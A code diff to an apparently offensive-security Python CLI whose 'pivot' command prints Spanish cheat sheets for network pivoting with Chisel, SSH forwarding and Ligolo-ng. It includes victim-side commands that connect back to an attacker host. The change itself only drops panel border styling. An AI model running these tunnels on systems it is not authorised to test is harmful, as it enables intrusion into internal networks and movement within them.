@@ -23,18 +23,18 @@ def cmd_pivot(argv: list[str]) -> int:
     ui.panel("Chisel", "túnel inverso: el agente sale hacia ti (atraviesa NAT/firewall)", [
         chisel,
         ui.note("con R:socks añade 'socks5 127.0.0.1 1080' a /etc/proxychains4.conf y usa proxychains."),
-    ], border=ui.ORANGE)
+    ])
 
     ssh = ui.table("Tipo", "Comando", "Para qué")
     ssh.add_row(ui.Text("Dinámico -D", style=ui.PURPLE), f"ssh -D 1080 -N user@PIVOT", "SOCKS por toda la red interna")
     ssh.add_row(ui.Text("Local -L", style=ui.PURPLE), f"ssh -L 8000:127.0.0.1:80 -N user@PIVOT", "traer un puerto del pivote a ti")
     ssh.add_row(ui.Text("Remoto -R", style=ui.PURPLE), f"ssh -R {port}:127.0.0.1:{port} -N user@ATACANTE", "exponer tu puerto en el pivote")
-    ui.panel("SSH forwarding", "si tienes credenciales SSH en el pivote", [ssh], border=ui.ORANGE)
+    ui.panel("SSH forwarding", "si tienes credenciales SSH en el pivote", [ssh])
 
     lig = ui.table("Dónde", "Comando")
     lig.add_row(ui.Text("Atacante (1)", style=ui.PURPLE), "sudo ip tuntap add user $USER mode tun ligolo; sudo ip link set ligolo up")
     lig.add_row(ui.Text("Atacante (2)", style=ui.PURPLE), f"./proxy -selfcert -laddr 0.0.0.0:{port}")
     lig.add_row(ui.Text("Víctima", style=ui.PURPLE), f"./agent -connect {lhost}:{port} -ignore-cert")
     lig.add_row(ui.Text("En el proxy", style=ui.PURPLE), "session; luego 'start'; añade rutas con 'ip route add SUBRED/24 dev ligolo'")
-    ui.panel("Ligolo-ng", "túnel por interfaz TUN: la red interna aparece como rutas locales", [lig], border=ui.ORANGE)
+    ui.panel("Ligolo-ng", "túnel por interfaz TUN: la red interna aparece como rutas locales", [lig])
     return 0
